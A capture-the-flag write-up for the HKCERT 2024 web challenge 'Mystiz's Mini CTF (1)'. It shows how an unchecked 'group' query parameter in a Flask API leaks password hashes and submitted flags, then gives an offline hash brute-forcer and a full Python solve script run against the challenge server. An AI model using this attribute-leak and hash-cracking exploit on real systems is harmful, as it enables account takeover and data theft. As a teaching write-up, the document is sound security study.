# Mystiz's Mini CTF (1)

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 48 solves / 200 points
- Author: @Mystiz
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

"A QA engineer walks into a bar. Orders a beer. Orders 0 beers. Orders 99999999999 beers. Orders a lizard. Orders -1 beers. Orders a ueicbksjdhd."

I am working on yet another CTF platform. I haven't implement all the features yet, but I am confident that it is at least secure.

Can you send me the flag of the challenge "Hack this site!"?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195204.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114183709.png)

In here, we can register and login to an account, view challenges and the scoreboard.

Let's register a new account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114184032.png)

After registering a new account, we can go to the "Challenges" page to view different CTF challenges:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114184055.png)

We can also go to the "Scoreboard" page to see who's at the top:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114184226.png)

Hmm... There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/Web/Mystizs-Mini-CTF-1/minictf-1_bc36d27733c38dceeec332324267b77d.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(1))-[2024.11.14|18:43:58(HKT)]
└> file minictf-1_bc36d27733c38dceeec332324267b77d.zip 
minictf-1_bc36d27733c38dceeec332324267b77d.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(1))-[2024.11.14|18:43:59(HKT)]
└> unzip minictf-1_bc36d27733c38dceeec332324267b77d.zip        
Archive:  minictf-1_bc36d27733c38dceeec332324267b77d.zip
  inflating: .gitignore              
   creating: web/
  inflating: web/Dockerfile          
  inflating: web/.gitignore          
  [...]
   creating: web/app/static/
  inflating: web/app/static/bitcoin.png  
  inflating: web/app/static/rickroll.gif  
  inflating: web/app/static/canary.png  
  inflating: docker-compose.yml      
```

After reading the source code a little bit, we can have the following findings:
1. This web application is written in Python with web application framework "[Flask](https://flask.palletsprojects.com/en/stable/)"
2. It uses DBMS (Database Management System) SQLite

First off, what's our objective? Where's the flag?

If we take a look at `web/migrations/versions/96fa27cc07b9_init.py`, we can see that the flag 1 is being inserted into table `Challenge` and `Attempt`:

```python
import os
from alembic import op
import sqlalchemy as sa
from datetime import date, datetime, timedelta

from app.db import db
from app.models.user import User
from app.models.challenge import Challenge, Category
from app.models.attempt import Attempt
[...]
def upgrade():
    [...]
    FLAG_1 = os.environ.get('FLAG_1', 'flag{***REDACTED1***}')
    [...]
    RELEASE_TIME_NOW    = date.today()
    [...]
    db.session.add(Challenge(id=1, title='Hack this site!', description=f'I was told that there is <a href="/" target="_blank">an unbreakable CTF platform</a>. Can you break it?', category=Category.WEB, flag=FLAG_1, score=500, solves=1, released_at=RELEASE_TIME_NOW))
    [...]
    db.session.add(Attempt(challenge_id=1, user_id=2, flag=FLAG_1, is_correct=True, submitted_at=RELEASE_TIME_NOW))
    db.session.commit()
```

With that said, our objective should be somehow **getting the flag via table `Challenge` or `Attempt`**.

Also, it is weird that **`user_id` 2 has submitted a correct flag for that challenge**.

In this `upgrade` function, it also inserted a user called `player` with `id=2`, and **its password is 3 hex characters long**:

```python
def upgrade():
    [...]
    PLAYER_PASSWORD = os.urandom(3).hex()
    [...]
    db.session.add(User(id=2, username='player', is_admin=False, score=500, password=PLAYER_PASSWORD, last_solved_at=datetime.fromisoformat('2024-05-11T03:05:00')))
```

Hmm... Does that means we can brute force `player`'s password?

Well. Nope. In the `/login/` POST route, **rate limiting** is implemented. It only allows **2 requests per minute**:

```python
from app.limiter import limiter
[...]
@route.route('/login/', methods=[HTTPMethod.POST])
@limiter.limit("2/minute")
def login_submit():
    [...]
```

`web/app/limiter.py`:

```python
from http import HTTPStatus
from flask import make_response, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(get_remote_address)

def init_app(app):
    limiter.init_app(app)

    @app.errorhandler(429)
    def rate_limit_error_handler(e):
        return make_response(jsonify({'error': 'You are sending too many requests. Please slow down.'}), HTTPStatus.TOO_MANY_REQUESTS)
```

Therefore, we can't really brute force `player`'s password.

Wait, even if we're authenticated as `player`, can we view the submitted correct flags? After reading the source code a little bit further, nope. There is no way we can view submitted flags... Or there IS a way to do it? :D

During getting a high-level overview of this web application, we can notice that in our Burp Suite HTTP history, there is a **GET request with parameter `group`** when we go to the "Challenges" page:

```http
GET /api/challenges/?group=category HTTP/1.1
Host: localhost:5000
Cookie: session=.eJwdzjkOwjAQAMC_uKaw197D-Uy0lwVtQirE34lopp5P2deR57Ns7-PKR9lfUbYSQxb6cGhjsZL7RAO7XRy4atCC2qmq25SlpMxJVaRB1EVM1kTFTLk1xhCpPNBnV2FNRJmeZB4WCMxgXXOQ1WBPn-QG4OWOXGce_03__gCj6C_9.ZzmXGg.BwNOsFcpqkrGWC_VjwHDbgONrSQ


```

Response:

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 17 Nov 2024 07:31:46 GMT
Connection: close
Content-Type: application/json
Content-Length: 1969

{"challenges":{"crypto":[{"category":"crypto","description":"<img src=\"/static/bitcoin.png\" class=\"rounded mx-auto d-block\">","id":2,"released_at":"Sun, 17 Nov 2024 00:00:00 GMT","score":500,"solves":0,"title":"cryp70 6r0s"},[...]}]}}
```

> Note: From now onwards, I'm testing the challenge locally. You can do this via command `docker compose up`.

Huh, I wonder what it does. Maybe it's related to database operation, like grouping stuff?

When we find the word "group", we should be able to find **class `GroupAPI` method `get` in `web/app/views/__init__.py`**:

```python
from flask import Blueprint, request, jsonify
from flask.views import MethodView
import collections
[...]
class GroupAPI(MethodView):
    init_every_request = False

    def __init__(self, model):
        self.model = model

        self.name_singular = self.model.__tablename__
        self.name_plural = f'{self.model.__tablename__}s'
    
    def get(self):
        # the users are only able to list the entries related to them
        items = self.model.query_view.all()

        group = request.args.get('group')

        if group is not None and not group.startswith('_') and group in dir(self.model):
            grouped_items = collections.defaultdict(list)
            for item in items:
                id = str(item.__getattribute__(group))
                grouped_items[id].append(item.marshal())
            return jsonify({self.name_plural: grouped_items}), 200

        return jsonify({self.name_plural: [item.marshal() for item in items]}), 200
```

In here, GET parameter's value `group` is a **model's attribute name**. If the attribute name exists in the model, it'll group by the attribute name.

Hmm... How does this class is being used?

Below this class, we can see 2 functions: `register_api` and `init_app`.

In `register_api`, it uses [Flask class-based views](https://flask.palletsprojects.com/en/stable/views/) to create a view function for different API endpoints:

```python
def register_api(app, model, name):
    group = GroupAPI.as_view(f'{name}_group', model)
    app.add_url_rule(f'/api/{name}/', view_func=group)
```

In [the Flask documentation about class `flask.views.View` method `as_view`](https://flask.palletsprojects.com/en/stable/api/#flask.views.View.as_view), it said:

> [...]If the view class sets [`init_every_request`](https://flask.palletsprojects.com/en/stable/api/#flask.views.View.init_every_request "flask.views.View.init_every_request") to `False`, the same instance will be used for every request.

In class `GroupAPI`, we can see that `init_every_request` is set to `False`:

```python
class GroupAPI(MethodView):
    init_every_request = False
```

With that said, routes that registered with this view will get executed.

But which routes has registered with that view?

```python
from app.models.user import User
from app.models.challenge import Challenge
from app.models.attempt import Attempt
[...]
def init_app(app):
    [...]
    register_api(app, User, 'users')
    register_api(app, Challenge, 'challenges')
    register_api(app, Attempt, 'attempts')
```

As we can see, API routes `/api/users`, `/api/challenges`, and `/api/attempts` are using `GroupAPI` view.

Ah ha! No wonder why we have that `group` GET parameter in our Burp Suite HTTP history!

## Exploitation

Hmm... Since **class `GroupAPI` method `get` doesn't restrict which attribute names we can use**, I wonder if we can group by any attributes in model `User`, `Challenge`, and `Attempt`.

Let's try model `Challenge`. In `web/app/models/challenge.py`, we can see that this model has 8 attributes.

```python
class Challenge(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String, nullable=False)
    description = db.Column(db.String, nullable=False)
    category = db.Column(db.Enum(Category), nullable=False)
    flag = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, nullable=False)
    solves = db.Column(db.Integer, nullable=False)
    released_at = db.Column(db.DateTime, nullable=False)
```

Let's try to group by `flag`:

```http
GET /api/challenges/?group=flag HTTP/1.1
Host: localhost:5000
Cookie: session=.eJwdzjkOwjAQAMC_uKaw197D-Uy0lwVtQirE34lopp5P2deR57Ns7-PKR9lfUbYSQxb6cGhjsZL7RAO7XRy4atCC2qmq25SlpMxJVaRB1EVM1kTFTLk1xhCpPNBnV2FNRJmeZB4WCMxgXXOQ1WBPn-QG4OWOXGce_03__gCj6C_9.ZzmXGg.BwNOsFcpqkrGWC_VjwHDbgONrSQ


```

Response data:

```json
{"challenges":{"21105392.c56f09ed330afc4b64f11ccc6e1ed9ee685ccf1295b5d8a124aa89c104db36e8":[{"category":"forensics","description":"\"I am thinking of the flag. Can you navigate in my memory and find what the flag is?\"","id":5,"released_at":"Sun, 17 Nov 2024 00:00:00 GMT","score":500,"solves":0,"title":"Memory Forensics"}],[...]]}}
```

Oh! It worked! We did leak all the flags. However, the flags seemed like are hashed?

In `web/app/models/challenge.py`, we can see that the developer used `sqlalchemy` to listen for a `set` event.

```python
from sqlalchemy import event
[...]
from app.util import compute_hash
[...]
@event.listens_for(Challenge.flag, 'set', retval=True)
def hash_challenge_flag(target, value, oldvalue, initiator):
    if value != oldvalue:
        return compute_hash(value)
    return value
```

When a new flag is inserted into the table, it'll call function `computer_hash` from `app.util`:

```python
import os
import hashlib
[...]
def compute_hash(password, salt=None):
    if salt is None:
        salt = os.urandom(4).hex()
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()
```

So yes, the flag is hashed into a format like this: `<salt>.<sha256_string>`. That being said, we can't brute force the correct flags.

Now, using the `group` GET parameter, we can leak a model's attribute's values.

This makes me wonder: **Can we leak all users' password?**

In `web/app/models/user.py`, we can see that model `User` has attribute `password`:

```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    password = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, default=0)
    last_solved_at = db.Column(db.DateTime)
```

To leak its values, we can send the following GET request:

```http
GET /api/users/?group=password HTTP/1.1
Host: localhost:5000
Cookie: session=.eJwdzjkOwjAQAMC_uKaw197D-Uy0lwVtQirE34lopp5P2deR57Ns7-PKR9lfUbYSQxb6cGhjsZL7RAO7XRy4atCC2qmq25SlpMxJVaRB1EVM1kTFTLk1xhCpPNBnV2FNRJmeZB4WCMxgXXOQ1WBPn-QG4OWOXGce_03__gCj6C_9.ZzmXGg.BwNOsFcpqkrGWC_VjwHDbgONrSQ


```

Response data:

```json
{"users":[...],"4dd34ac9.e0c9e1bbd6c30c96dd3b6d55ecba839c67afdc424b1fec20336db000230cc447":[{"id":2,"is_admin":false,"score":500,"username":"player"}],[...]]}}
```

Nice! We successfully leaked `player`'s password hash!

Again, similar to the challenges' flag, all passwords are hashed in the exact same way:

```python
@event.listens_for(User.password, 'set', retval=True)
def hash_user_password(target, value, oldvalue, initiator):
    if value != oldvalue:
        return compute_hash(value)
    return value
```

Since now we have `player`'s password hash, we can **brute force it *offline***. This is doable because `player`'s password is only 3 hex characters long, which is brute force-able.

To do so, we can use the following Python script:

```python
import hashlib

def compute_hash(password, salt=None):
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()

def bruteForcePassword(targetPassword):
    for i in range(0, 0xffffff + 1):
        password = hex(i).replace('0x', '').rjust(6, '0')
        print(f'[*] Trying password: {password}', end='\r')
        salt, digest = targetPassword.split('.')
        hash = compute_hash(password, salt)

        if hash != targetPassword:
            continue

        print(f'\n[+] Found correct password: {password}')
        return password

def main():
    bruteForcePassword('4dd34ac9.e0c9e1bbd6c30c96dd3b6d55ecba839c67afdc424b1fec20336db000230cc447')

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(1))-[2024.11.17|16:28:50(HKT)]
└> python3 solve.py       
[*] Trying password: 520d71
[+] Found correct password: 520d71
```

Nice! Let's login as `player` with that password!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117163311.png)

After that, we can use the same logic to leak the submitted flag in the `Attempt` model:

```python
class Attempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    challenge_id = db.Column(db.ForeignKey('challenge.id'), nullable=False)
    user_id = db.Column(db.ForeignKey('user.id'), nullable=False)
    flag = db.Column(db.String, nullable=False)
    is_correct = db.Column(db.Boolean, nullable=False)
    submitted_at = db.Column(db.DateTime, nullable=False)
```

```http
GET /api/attempts/?group=flag HTTP/1.1
Host: localhost:5000
Cookie: session=.eJwdzjkOwjAQAMC_uKawN97DfCbaU9AmUCH-TkQz9XzaXkeej3Z_He-8tf0Z7d5iSqFPhzGLldwXGthlcWD1oIK-UVe3JaWkzEldZED0IiYbomKmPAZjiHSe6GtTYU1EWZ5kHhYIzGCb5iTrwZ6-yA3A2xV5n3n8N_D9AaPmL_w.ZzmqTQ.0Z8KDr2IXGEMIfrdwq4jWs8x3Io


```

Response data:

```json
{"attempts":{"hkcert24{this_is_a_test_flag_1}":[{"challenge_id":1,"id":1,"is_correct":true,"user_id":2}]}}
```

We got the flag locally! Let's write a Python solve script to get the real flag on the remote instance!

**Steps:**
1. Register a new account
2. Leak `player`'s password hash via sending a GET request to `/api/me/?group=password`
3. Brute force `player`'s password hash in offline
4. Login as `player` with the cracked password
5. Get the flag via sending a GET request to `/api/attempts/?group=flag`

<details><summary><strong>solve.py</strong></summary>

```python
import hashlib
import requests
import random
import string

class Solver():
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.REGISTER_ENDPOINT = f'{self.baseUrl}/register/'
        self.LOGIN_ENDPOINT = f'{self.baseUrl}/login/'
        self.LEAK_PASSWORD_ENDPOINT = f'{self.baseUrl}/api/users/?group=password'
        self.LEAK_SUBMITTED_FLAG_ENDPOINT = f'{self.baseUrl}/api/attempts/?group=flag'

    @staticmethod
    def getRandomString(length):
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

    @staticmethod
    def compute_hash(password, salt=None):
        return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()

    @staticmethod
    def bruteForcePassword(targetPassword):
        for i in range(0, 0xffffff + 1):
            password = hex(i).replace('0x', '').rjust(6, '0')
            print(f'[*] Trying password: {password}', end='\r')
            salt, digest = targetPassword.split('.')
            hash = Solver.compute_hash(password, salt)

            if hash != targetPassword:
                continue

            print(f'\n[+] Found correct password: {password}')
            return password

    def register(self):
        self.username = Solver.getRandomString(10)
        self.password = Solver.getRandomString(10)

        data = {
            'username': self.username,
            'password': self.password
        }
        responseStatusCode = self.session.post(self.REGISTER_ENDPOINT, data=data).status_code
        if responseStatusCode == 404:
            print('[-] Unable to register a new account')
            exit(0)

    def leakPasswordHash(self):
        users = self.session.get(self.LEAK_PASSWORD_ENDPOINT).json()['users']
        for passwordHash, value in users.items():
            if value[0]['username'] != 'player':
                continue

            print(f'[+] Password hash: {passwordHash}')
            return passwordHash

    def login(self, username, password):
        data = {
            'username': username,
            'password': password
        }
        self.session.post(self.LOGIN_ENDPOINT, data=data)

    def leakFlag(self):
        attempts = self.session.get(self.LEAK_SUBMITTED_FLAG_ENDPOINT).json()['attempts']
        flag = next(iter(attempts))
        print(f'[+] Flag: {flag}')

    def solve(self):
        self.register()
        passwordHash = self.leakPasswordHash()
        password = Solver.bruteForcePassword(passwordHash)

        self.login('player', password)
        self.leakFlag()

def main():
    # baseUrl = 'http://localhost:5000' # for local testing
    baseUrl = 'https://c16a-minictf-1-t195-4qnjznemcwmox2j5r57z6qe4.hkcert24.pwnable.hk'
    solver = Solver(baseUrl)

    solver.solve()

if __name__ == '__main__':
    main()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(1))-[2024.11.17|16:45:41(HKT)]
└> python3 solve.py       
[+] Password hash: 77364c85.744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94
[*] Trying password: 7df71e
[+] Found correct password: 7df71e
[+] Flag: hkcert24{y0u_c4n_9r0up_unsp3c1f13d_4t7r1bu73s_fr0m_th3_4tt3mp7_m0d3l}
```

- **Flag: `hkcert24{y0u_c4n_9r0up_unsp3c1f13d_4t7r1bu73s_fr0m_th3_4tt3mp7_m0d3l}`**

## Conclusion

What we've learned:

1. Leaking ORM model attributes